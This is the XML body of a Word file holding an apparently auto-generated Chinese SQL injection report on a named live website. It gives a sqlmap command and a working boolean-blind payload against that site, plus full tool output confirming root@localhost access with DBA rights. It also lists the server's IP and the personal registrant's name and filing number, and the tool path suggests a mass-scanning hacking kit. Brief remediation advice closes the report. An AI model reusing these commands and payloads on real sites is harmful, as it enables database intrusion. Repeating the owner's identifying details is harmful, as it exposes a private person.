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漏洞类型：SQL注入漏洞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即当应用程序使用输入内容来构造动态SQL语句以访问数据库时，如果对输入的参数没有进行严格的过滤或者过滤不完整将会导致SQL注入攻击的产生。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞危害</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>恶意用户通过构造特殊的SQL查询语句把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。从而可以获取到数据库的相关信息，包括数据库账号密码信息，甚至可上传木马，从而控制服务器。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞详情</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>网站漏洞报表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>注入网址:http://www.35335.com/project/zcfysg*.shtml</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">执行命令:python sqlmap.py -u http://www.35335.com/project/zcfysg*.shtml --random-agent --dbs  --current-user --current-db --is-db </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:br/>
        <w:t>注入参数(方式) : #1* (URI)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : boolean-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : AND boolean-based blind - WHERE or HAVING clause</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : http://www.35335.com:80/project/zcfysg' AND 3910=3910 AND 'NJfX'='NJfX.shtml</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>数据库类型 : MySQL</w:t>
        <w:br/>
        <w:br/>
        <w:t>服务器语言 : Nginx 1.12.2, JSP</w:t>
        <w:br/>
        <w:br/>
        <w:t>数据库版本 : MySQL &gt;= 5.0.2</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>网站信息报表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>百度权重  4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站主页  http://www.35335.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站描述  "seo综合查询可以查到该网站各大搜索引擎的信息，包括收录，反链及关键词排名，也可以一目了然的看到该域名的相关信息，比如域名年龄相关备案等等，及时调整网站优化。" /</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站标题  http://www.35335.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>IP__坐标  加拿大 安大略省多伦多腾讯云计算有限公司北美数据中心</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>所属__IP  49.51.10.192</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站年龄  9年7月1天（创建于2009年10月02日,过期时间为2019年10月02日)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>备案编号  粤ICP备17146273号-1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>备案性质  个人</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>备案名称  李邦华</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>备案时间  2017/11/20 0:00:00</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>百度收录  17万5000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>协议类型  HTTP/1.1 200 OK</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">页面类型   text/html; charset=UTF-8  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">服务类型   nginx/1.12.2 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>程序语言  暂无信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>网站漏洞复现</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>执行命令</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">python sqlmap.py -u http://www.35335.com/project/zcfysg*.shtml --random-agent --dbs  --current-user --current-db --is-db </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>返回结果</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="XiaoLv"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        ___</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">       __H__</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve"> ___ ___["]_____ ___ ___  {1.2.11.6#dev}</w:t>
        <w:br/>
        <w:br/>
        <w:t>|_ -| . [(]     | .'| . |</w:t>
        <w:br/>
        <w:br/>
        <w:t>|___|_  [']_|_|_|__,|  _|</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">      |_|V          |_|   http://sqlmap.org</w:t>
        <w:br/>
        <w:br/>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br/>
        <w:br/>
        <w:t>[*] starting @ 00:42:05 /2019-05-03/</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>[00:42:05] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; ja; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3' from file 'D:\HACKER_TOOLS\LANGZI_HACKER\LANGZI_SQL_INJECTION\Auto_ExtrAct_1.0\sqlmap\txt\user-agents.txt'</w:t>
        <w:br/>
        <w:br/>
        <w:t>custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:05] [INFO] testing connection to the target URL</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:06] [INFO] checking if the target is protected by some kind of WAF/IPS</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:06] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS</w:t>
        <w:br/>
        <w:br/>
        <w:t>do you want sqlmap to try to detect backend WAF/IPS? [y/N] N</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:06] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:06] [INFO] testing if the target URL content is stable</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:07] [INFO] target URL content is stable</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:07] [INFO] testing if URI parameter '#1*' is dynamic</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:07] [WARNING] URI parameter '#1*' does not appear to be dynamic</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:07] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:07] [INFO] testing for SQL injection on URI parameter '#1*'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:08] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:10] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:10] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:10] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:10] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:10] [INFO] testing 'MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:10] [INFO] testing 'MySQL inline queries'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:10] [INFO] testing 'PostgreSQL inline queries'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:10] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:10] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:10] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:10] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:10] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:10] [INFO] testing 'PostgreSQL &gt; 8.1 AND time-based blind'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:11] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:11] [INFO] testing 'Oracle AND time-based blind'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:12] [INFO] checking if the injection point on URI parameter '#1*' is a false positive</w:t>
        <w:br/>
        <w:br/>
        <w:t>URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</w:t>
        <w:br/>
        <w:br/>
        <w:t>sqlmap identified the following injection point(s) with a total of 77 HTTP(s) requests:</w:t>
        <w:br/>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:br/>
        <w:t>Parameter: #1* (URI)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Type: boolean-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Title: AND boolean-based blind - WHERE or HAVING clause</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Payload: http://www.35335.com:80/project/zcfysg' AND 3910=3910 AND 'NJfX'='NJfX.shtml</w:t>
        <w:br/>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:13] [INFO] testing MySQL</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:13] [INFO] confirming MySQL</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:14] [INFO] the back-end DBMS is MySQL</w:t>
        <w:br/>
        <w:br/>
        <w:t>web application technology: Nginx 1.12.2, JSP</w:t>
        <w:br/>
        <w:br/>
        <w:t>back-end DBMS: MySQL &gt;= 5.0.2</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:14] [INFO] fetching current user</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:14] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>[00:42:14] [INFO] retrieved: root@localhost</w:t>
        <w:br/>
        <w:br/>
        <w:t>current user:    'root@localhost'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:24] [INFO] fetching current database</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">[00:42:24] [INFO] retrieved: </w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:32] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'</w:t>
        <w:br/>
        <w:br/>
        <w:t>current database:</w:t>
        <w:tab/>
        <w:t>None</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:32] [INFO] testing if current user is DBA</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:32] [INFO] fetching current user</w:t>
        <w:br/>
        <w:br/>
        <w:t>current user is DBA:    True</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:32] [WARNING] information_schema not available, back-end DBMS is MySQL &lt; 5. database names will be fetched from 'mysql' database</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:32] [INFO] fetching number of databases</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">[00:42:32] [INFO] retrieved: </w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:32] [ERROR] unable to retrieve the number of databases</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:32] [INFO] falling back to current database</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:32] [INFO] fetching current database</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">[00:42:32] [INFO] retrieved: </w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>[00:42:33] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:33] [CRITICAL] unable to connect to the target URL ('')</w:t>
        <w:br/>
        <w:br/>
        <w:t>[00:42:33] [WARNING] HTTP error codes detected during run:</w:t>
        <w:br/>
        <w:br/>
        <w:t>404 (Not Found) - 64 times</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>[*] ending @ 00:42:33 /2019-05-03/</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>敏感数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:br/>
        <w:t>注入参数(方式) : #1* (URI)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : boolean-based blind</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : AND boolean-based blind - WHERE or HAVING clause</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : http://www.35335.com:80/project/zcfysg' AND 3910=3910 AND 'NJfX'='NJfX.shtml</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>数据库类型 : MySQL</w:t>
        <w:br/>
        <w:br/>
        <w:t>服务器语言 : Nginx 1.12.2, JSP</w:t>
        <w:br/>
        <w:br/>
        <w:t>数据库版本 : MySQL &gt;= 5.0.2</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>当前用户:    'root@localhost'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>当前数据库:</w:t>
        <w:tab/>
        <w:t>None</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>是否有DBA权限:    True</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>修复建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>代码原理防护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        1.对用户的输入进行严格过滤，包括所有的参数，URL和HTTP头部等所有需要传给数据库的数据。</w:t>
        <w:br/>
        <w:t xml:space="preserve">        包括但不限于以下字符及字符串</w:t>
        <w:br/>
        <w:t xml:space="preserve">        select and or like regxp from where update exec order by having drop delete ( ) [ ] &lt; &gt; , . ; : ' " # % + - _ = / * @</w:t>
        <w:br/>
        <w:t xml:space="preserve">        2.预编译SQL语句，而不要动态组装SQL语句，否则必须确保在使用输入的数据组装成SQL语句之前，对特殊字符进行预处理。</w:t>
        <w:br/>
        <w:t xml:space="preserve">        3.以最小权限执行SQL语句</w:t>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>安全防火墙防护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        1.安装网站防火墙</w:t>
        <w:br/>
        <w:t xml:space="preserve">        2.接入云WAF</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